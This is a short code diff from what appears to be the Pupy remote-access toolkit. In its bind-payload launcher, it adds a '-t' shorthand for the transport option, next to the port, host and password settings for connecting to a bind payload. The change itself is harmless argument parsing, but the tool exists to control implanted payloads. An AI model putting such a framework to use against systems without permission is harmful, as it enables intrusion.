@@ -17,7 +17,7 @@ class BindLauncher(BaseLauncher):
         self.arg_parser = LauncherArgumentParser(prog="bind", description=self.__doc__)
         self.arg_parser.add_argument('--port', metavar='<port>', type=int, required=True, help='the port to bind on')
         self.arg_parser.add_argument('--host', metavar='<ip>', default='0.0.0.0', help='the ip to listen on (default 0.0.0.0)')
-        self.arg_parser.add_argument('--transport', choices=[x for x in network.conf.transports.iterkeys()], default="ssl", help="the transport to use ! (the pupysh.sh --connect will need to be configured with the same transport) ")
+        self.arg_parser.add_argument('-t', '--transport', choices=[x for x in network.conf.transports.iterkeys()], default="ssl", help="the transport to use ! (the pupysh.sh --connect will need to be configured with the same transport) ")
         self.arg_parser.add_argument('--password', default=config.get("pupyd", "bind_password").strip(), help="Add a password to connect to the bind payload. WARNING: it could not be safe, a safer alternative would be to use rpyc authenticators with SSL client certificates")
         self.arg_parser.add_argument('transport_args', nargs=argparse.REMAINDER, help="change some transport arguments")
 
